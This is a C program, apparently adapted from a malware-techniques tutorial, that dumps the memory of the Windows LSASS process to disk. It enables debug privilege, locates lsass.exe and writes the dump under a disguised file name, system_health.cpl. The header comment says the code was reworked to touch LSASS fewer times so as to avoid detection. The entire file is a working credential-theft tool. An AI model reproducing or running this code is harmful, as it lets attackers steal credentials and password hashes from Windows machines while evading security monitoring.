/*
 * Credit to @cocomelonc for the code linked below. 
 * https://cocomelonc.github.io/tutorial/2023/05/11/malware-tricks-28.html
 * I have expanded it to use data structures in 'ProcessInfo' to reduce the number of accesses to LSASS to avoid statistical detection.
 * then I have encapsulated the 'getProcessInfo' and 'createMiniDump' functions for easier maintenance and modularity.
*/
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <dbghelp.h>
#pragma comment(lib, "dbghelp.lib")

// Structure to cache process information
typedef struct _ProcessInfo {
  DWORD processId;
  char szExeFile[MAX_PATH];
} ProcessInfo;

#define MAX_PROCESSES 1024

int findMyProc(const char *procname, ProcessInfo *processes, int processCount) {
  for (int i = 0; i < processCount; i++) {
    if (strcmp(procname, processes[i].szExeFile) == 0) {
      return processes[i].processId;
    }
  }
  return 0;
}

// Get process information and cache it
int getProcessInfo(ProcessInfo *processes, int maxProcesses) {
  HANDLE hSnapshot;
  PROCESSENTRY32 pe;
  BOOL hResult;
  int processCount = 0;

  // snapshot of all processes in the system
  hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
  if (INVALID_HANDLE_VALUE == hSnapshot) return 0;

  // initializing size: needed for using Process32First
  pe.dwSize = sizeof(PROCESSENTRY32);

  // info about first process encountered in a system snapshot
  hResult = Process32First(hSnapshot, &pe);

  // retrieve information about the processes and cache it
  while (hResult && processCount < maxProcesses) {
    strncpy(processes[processCount].szExeFile, pe.szExeFile, MAX_PATH);
    processes[processCount].processId = pe.th32ProcessID;
    processCount++;
    hResult = Process32Next(hSnapshot, &pe);
  }

  // closes an open handle (CreateToolhelp32Snapshot)
  CloseHandle(hSnapshot);
  return processCount;
}

// set privilege
BOOL setPrivilege(LPCTSTR priv) {
  HANDLE token;
  TOKEN_PRIVILEGES tp;
  LUID luid;
  BOOL res = TRUE;

  if (!LookupPrivilegeValue(NULL, priv, &luid)) res = FALSE;

  tp.PrivilegeCount = 1;
  tp.Privileges[0].Luid = luid;
  tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

  if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &token)) res = FALSE;
  if (!AdjustTokenPrivileges(token, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL)) res = FALSE;
  printf(res ? "successfully enable %s :)\n" : "failed to enable %s :(\n", priv);
  return res;
}

// minidump lsass.exe
BOOL createMiniDump(ProcessInfo *processes, int processCount) {
  bool dumped = FALSE;
  int pid = findMyProc("lsass.exe", processes, processCount);
  HANDLE ph = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, 0, pid);
  HANDLE out = CreateFile((LPCTSTR)"c:\\temp\\system_health.cpl", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
  if (ph && out != INVALID_HANDLE_VALUE) {
    dumped = MiniDumpWriteDump(ph, pid, out, (MINIDUMP_TYPE)0x00000002, NULL, NULL, NULL);
    printf(dumped ? "successfully dumped to lsass.dmp :)\n" : "failed to dump :(\n");
  }
  return dumped;
}

int main(int argc, char* argv[]) {
  ProcessInfo processes[MAX_PROCESSES];
  int processCount = getProcessInfo(processes, MAX_PROCESSES);
  
  if (!setPrivilege(SE_DEBUG_NAME)) return -1;
  if (!createMiniDump(processes, processCount)) return -1;
  return 0;
}
